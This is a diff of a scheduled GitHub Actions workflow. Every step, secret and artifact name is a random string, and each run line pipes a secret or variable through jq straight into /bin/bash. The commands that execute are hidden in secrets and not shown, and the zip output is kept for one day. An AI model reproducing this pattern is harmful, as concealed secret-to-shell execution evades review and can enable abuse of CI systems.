@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '33 0,6,12,18 * * *'
+    - cron: '54 2,8,14,20 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,19 +11,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: zhengsonglianghe
         env:
-          sibqi46819: ${{ secrets.sibqi46819 }}
+          uezz343: ${{ secrets.uezz343 }}
         run: |
-          printf '%s' "$sibqi46819" | jq -r .memdx76 | /bin/bash
-          printf '%s' "$oum3140" | jq -r .w484 | /bin/bash
-          printf '%s' "$ufxd9279" | jq -r .wdh0 | /bin/bash
-          echo $nmwjo912 | jq -r .h233 | /bin/bash
-          echo $one20 | jq -r .ab3 | /bin/bash
-          echo $n73 | jq -r .y37 | /bin/bash
-          echo $ftx2897 | jq -r .jl4515 | /bin/bash
+          printf '%s' "$uezz343" | jq -r .t66974 | /bin/bash
+          echo $oyx4 | jq -r .bdgju060 | /bin/bash
+          printf '%s' "$vujbe5358" | jq -r .ipnl5379 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: RxOL4KKo
+          name: AZANzvmB
           path: "*.zip"
           retention-days: 1
